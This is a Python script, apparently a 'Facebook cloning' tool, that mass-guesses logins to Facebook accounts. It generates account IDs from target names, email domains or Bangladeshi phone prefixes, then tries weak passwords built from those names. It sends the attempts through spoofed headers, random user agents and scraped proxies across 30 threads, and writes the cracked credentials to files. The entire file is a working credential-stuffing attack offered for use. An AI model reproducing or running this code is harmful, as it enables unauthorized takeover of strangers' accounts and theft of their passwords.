import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
logo = ("""\x1b[1;97m

 88888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
 88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
 88oobY' 88ooo88 88oooo   `8bo.  88ooo88 88V8o 88
 88`8b   88°°°88 88°°°°    `Y8b. 88°°°88 88 V8o88 
 88 `88. 88   88 88      db   8D 88   88 88  V888 
 88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
\x1b[1;97m__________________________________________________
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m AUTHOR  : RAFSAN AHAMMED RAFI
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. ARIF MIA
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m GITHUB  : R4FSAN-143
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m WATHAPP : 0130xxxxx54
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m TOOLS   : MULTIPLE 
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m Stetus  : TRAIL
\033[38;5;196m[\033[38;5;195m★\033[38;5;196m]\x1b[1;97m VIRSION : 0.3
__________________________________________________""")

class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        os.system('xdg-open https://facebook.com/groups/3206414299669908/')
        print(logo)
        print(" [1] FACEBOOK EMAIL CLONING")
        print(" [2] FACEBOOK USER NAME CLONING")
        print(" [3] FACEBOOK RANDOM CLONING[\033[1;35mBANGLADESH]")
        print("\x1b[1;97m [0] Exit")
        print("\x1b[1;97m__________________________________________________")
        Snigdho =input(" [√] Choose : ")
        if Snigdho in ["1", "01"]:
            v1()
        if Snigdho in ["2", "02"]:
            v2()
        if Snigdho in ["3","03"]:
            v3()
        if Snigdho in [" 0", "00"]:
            exit()
        else:
            exit()
def v1():
    user=[]
    os.system('clear')
    os.system('xdg-open https://facebook.com/groups/3206414299669908/')
    print(logo)
    kode = input('[√]  TARGET FAST NAME : ')
    kodex = input('[√] TARGET LAST NAME :  ')
    print(' [√] Example Doamin : @gmail.com, @yahoo.com ')
    doamin = input(' [√]  Input Doamin  : ')
    limit = int(input('[?] How many numbers do you want to add : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' [√]  Total ids:\033[1;92m '+tl)
        print(f"\033[1;97m [√]  Target Doamin:\033[1;92m {doamin}")
        print(' \033[1;97m[√]  The process has been started')
        print(' [√]  Wait for ids ')
        print(50*'_')
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
   
    print(50*'_')
    print(' [√] Crack process has been completed')
    print(' [√] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def v2():
    user=[]
    os.system('clear')
    os.system('xdg-open https://facebook.com/groups/3206414299669908/')
    print(logo)
    kode = input(' [√]  TARGET FAST NAME : ')
    kodex = input(' [√] TARGET LAST NAME :  ')
    doamin = '.'
    limit = int(input('[?] How many numbers do you want to add : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' [★]  Total ids:\033[1;92m '+tl)
        print(f"\033[1;97m [★]  Target Doamin:\033[1;92m Facebook CLONING (name)")
        print(' \033[1;97m[★]  The process has been started')
        print(' [★]  Wait for ids ')
        print(50*'_')
        for guru in user:
            uid = kode+doamin+kodex+guru
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(50*'_')
    print(' [√] Crack process has been completed')
    print(' [√] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def v3():
    user=[]
    os.system('clear')
    os.system('xdg-open https://facebook.com/groups/3206414299669908/')
    print(logo)
    print('Example [017]  [016]   [018]   [019]')
    kode = input(' [√] Enter sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    doamin = ' Facebook CLONING (BD number) '
    limit = int(input('[?] How many numbers do you want to add : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        os.system('xdg-open https://facebook.com/groups/3206414299669908/')
        print(logo)
        tl = str(len(user))
        print(' [★] Total ids:\033[1;92m '+tl)
        print(f"\033[1;97m [★] Target Doamin:\033[1;92m {doamin}")
        print(' \033[1;97m[√] The process has been started')
        print(' [√]  Wait for ids ')
        print(50*'_')
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(50*'_')
    print(' [√] Crack process has been completed')
    print(' [√] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mR4FSAN-XD\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'x.facebook.com',
            "method": 'page',
            "scheme": 'https',
            'authority': 'developer.facebook.com',
            'x-fb-rlafr': '0',
            'access-control-allow-origin': '*',
            'facebook-api-version': 'v16.0',
            'strict-transport-security': 'max-age=15552000',
            'pragma': 'no-cache',
            'cache-control': 'private, no-cache, no-store, must-revalidate',
            'x-fb-request-id': 'AUr43zMsWWeZFHzOkGRPBeM',
            'x-fb-trace-id': 'Cq0hhVhzMlz',
            'x-fb-rev': '1007130069',
            'x-fb-debug': 'IYVpFZQ4PoZeYrV7RPd45zq4IpWU4x06QZ8z2K773AGLnt+D+P0IWDVPU7jmS8F5PQdcRwmvWvLFn/TmWJ06Gw==',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Android 6.0.1; Mobile; rv:43.0) Gecko/43.0 Firefox/43.0',}
            lo = session.post('https://developer.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[R4FSAN-OK] {uid}|{ps}")
                open('/sdcard/R4FSAN/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[R4FSAN-CP] {uid}|{ps}")
                open('/sdcard/R4FSAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[R4FSAN-XD] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()